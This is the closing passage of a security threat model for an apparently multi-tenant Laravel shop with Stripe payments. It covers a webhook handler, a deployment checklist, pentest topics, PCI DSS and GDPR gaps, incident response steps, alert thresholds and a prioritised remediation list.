            \Log::error('Payment intent missing order_id', ['pi' => $paymentIntent->id]);
            return;
        }
        
        DB::table('orders')
            ->where('order_id', $orderId)
            ->update([
                'payment_status' => 'paid',
                'payment_intent_id' => $paymentIntent->id,
                'paid_at' => now(),
            ]);
        
        \Log::info('Payment succeeded', [
            'order_id' => $orderId,
            'amount' => $paymentIntent->amount / 100,
        ]);
    }
    
    private function handlePaymentFailed($paymentIntent)
    {
        $orderId = $paymentIntent->metadata->order_id ?? null;
        
        DB::table('orders')
            ->where('order_id', $orderId)
            ->update(['payment_status' => 'failed']);
        
        \Log::warning('Payment failed', [
            'order_id' => $orderId,
            'error' => $paymentIntent->last_payment_error->message ?? 'Unknown',
        ]);
    }
    
    private function handleRefund($charge)
    {
        // Mark order as refunded
        $paymentIntentId = $charge->payment_intent;
        
        DB::table('orders')
            ->where('payment_intent_id', $paymentIntentId)
            ->update([
                'payment_status' => 'refunded',
                'refunded_at' => now(),
            ]);
    }
}
```

**Route:**

```php
// routes/api.php
Route::post('/webhooks/stripe', [StripeWebhookController::class, 'handle'])
    ->middleware(['api']) // NO CSRF middleware for webhooks
    ->withoutMiddleware(['detect.tenant']); // Webhooks are global
```

---

## Deployment Checklist

### Pre-Deployment

- [ ] Run all migrations (FKs, indexes, tokens)
- [ ] Enable security headers middleware
- [ ] Set `APP_ENV=production`, `APP_DEBUG=false`
- [ ] Set `SESSION_SECURE_COOKIE=true`
- [ ] Configure CORS whitelist
- [ ] Set up Stripe webhook endpoint
- [ ] Add STRIPE_WEBHOOK_SECRET to .env
- [ ] Enable rate limiting on all routes
- [ ] Encrypt tenant database credentials
- [ ] Add audit logging

### Post-Deployment

- [ ] Monitor for 429 errors (rate limiting)
- [ ] Monitor for 401 errors (authentication)
- [ ] Check Stripe webhook delivery (Stripe Dashboard)
- [ ] Run security scan (OWASP ZAP, Burp Suite)
- [ ] Penetration testing (external firm)
- [ ] Set up alerts (Sentry, Datadog)

---

## Penetration Testing Recommendations

1. **OWASP Top 10 Testing:**
   - Injection (SQL, XSS, Command)
   - Broken Authentication
   - Sensitive Data Exposure
   - XML External Entities (N/A for this app)
   - Broken Access Control
   - Security Misconfiguration
   - Cross-Site Scripting (XSS)
   - Insecure Deserialization
   - Using Components with Known Vulnerabilities
   - Insufficient Logging & Monitoring

2. **Multi-Tenancy Testing:**
   - Tenant isolation
   - Cross-tenant data access
   - Subdomain enumeration
   - Header injection attacks

3. **Payment Testing:**
   - Amount manipulation
   - Webhook forgery
   - Refund fraud
   - Currency manipulation

4. **DDoS Testing:**
   - Rate limit bypass
   - Slowloris attack
   - API abuse

---

## Compliance Requirements

### PCI DSS (Payment Card Industry Data Security Standard)

**Current Status:** ❌ Not Compliant

**Requirements:**
1. ✅ Use Stripe SDK (no card data touches server)
2. ❌ HTTPS only (HTTP allowed)
3. ❌ Secure cookies
4. ❌ Audit logging
5. ❌ Vulnerability scanning

**Steps to Compliance:**
- Force HTTPS (HSTS)
- Enable audit logging
- Run quarterly vulnerability scans
- Annual penetration testing

---

### GDPR (General Data Protection Regulation)

**Current Status:** ⚠️ Partial Compliance

**Requirements:**
1. ❌ Data encryption at rest (tenant credentials)
2. ⚠️ Data minimization (collecting unnecessary PII)
3. ❌ Right to deletion (no GDPR endpoints)
4. ❌ Data breach notification process
5. ⚠️ Privacy policy (not reviewed)

**Steps to Compliance:**
- Encrypt PII in database
- Add GDPR endpoints (export, delete)
- Document data retention policy
- Add cookie consent banner

---

## Incident Response Plan

### 1. Data Breach

**Indicators:**
- Unusual database queries
- Large data exports
- Failed login attempts spike
- Tenant credential leak

**Response:**
1. Isolate affected systems (disable tenant)
2. Rotate all credentials
3. Notify affected customers (within 72 hours for GDPR)
4. Conduct forensic analysis
5. Patch vulnerability
6. File breach reports (if required)

---

### 2. DDoS Attack

**Indicators:**
- Traffic spike (10x normal)
- High CPU/memory usage
- 429 errors widespread

**Response:**
1. Enable Cloudflare DDoS protection
2. Increase rate limiting (throttle more aggressively)
3. Block malicious IPs
4. Contact hosting provider
5. Scale infrastructure (auto-scaling)

---

### 3. Payment Fraud

**Indicators:**
- Multiple failed payments
- Chargebacks spike
- Unusual order patterns

**Response:**
1. Disable affected payment method
2. Review Stripe logs
3. Contact Stripe support
4. Refund affected customers
5. Add fraud detection (Stripe Radar)

---

## Monitoring & Alerting

### Critical Alerts (Page Ops)

1. **Authentication failures > 100/min** → Brute force attack
2. **Rate limiting triggered > 1000/min** → DDoS attack
3. **Stripe webhook signature failures > 10** → Webhook attack
4. **Database connection failures > 5** → DB outage
5. **Order creation failure rate > 10%** → System issue

### Warning Alerts (Email Ops)

6. **Slow queries > 1s** → Performance degradation
7. **Disk space < 20%** → Storage filling up
8. **Memory usage > 80%** → Memory leak
9. **CPU usage > 90%** → Performance issue
10. **Error rate > 5%** → Application bug

---

## Summary

**Total Threats Identified:** 23  
**Critical:** 10  
**High:** 8  
**Medium:** 5  

**Immediate Action Items (Next 7 Days):**
1. Add authentication to all API endpoints
2. Fix order ID race condition
3. Encrypt tenant database credentials
4. Restrict CORS to frontend domains
5. Add rate limiting (60/min global, 5/min for writes)
6. Add Stripe webhook handler with signature verification
7. Add security headers middleware
8. Secure cookies (Secure, HttpOnly, SameSite)

**Short-Term Action Items (Next 30 Days):**
9. Add foreign key constraints
10. Add indexes for performance
11. Implement audit logging
12. Add CAPTCHA to forms
13. Set up monitoring & alerting
14. Run security scan (OWASP ZAP)
15. Add GDPR endpoints (export, delete)

**Long-Term Action Items (Next 90 Days):**
16. Penetration testing (external firm)
17. PCI DSS compliance audit
18. GDPR compliance audit
19. Implement WAF (Web Application Firewall)
20. Set up intrusion detection (IDS/IPS)

---

**End of SECURITY_THREAT_MODEL.md**

